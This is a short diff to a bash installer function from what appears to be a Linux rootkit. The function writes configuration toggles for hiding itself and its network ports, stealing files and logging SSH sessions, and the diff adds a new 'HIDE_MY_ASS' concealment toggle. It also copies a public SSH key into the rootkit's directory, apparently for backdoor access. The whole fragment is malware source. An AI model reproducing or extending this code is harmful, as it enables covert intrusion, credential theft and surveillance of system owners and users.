@@ -128,7 +128,7 @@ setup_configuration(){
 
         necho "Writing necessary files"
         write_defaults $NEW_MDIR/settings.cfg
-        local check_toggles=(USE_CRYPT HIDE_SELF HIDE_PORTS FILE_STEAL LOG_SSH READ_GID_FROM_FILE)
+        local check_toggles=(USE_CRYPT HIDE_SELF HIDE_PORTS FILE_STEAL LOG_SSH READ_GID_FROM_FILE HIDE_MY_ASS)
         for toggle in ${check_toggles[@]}; do toggle_setting $toggle >> $NEW_MDIR/toggles.cfg; done
         [ -f ./etc/.rolf ] && cp ./etc/.rolf $NEW_MDIR/.rolf
         [ -f ./etc/id_rsa.pub ] && { verbose 'Copying id_rsa.pub'; cp ./etc/id_rsa.pub $NEW_MDIR/; }
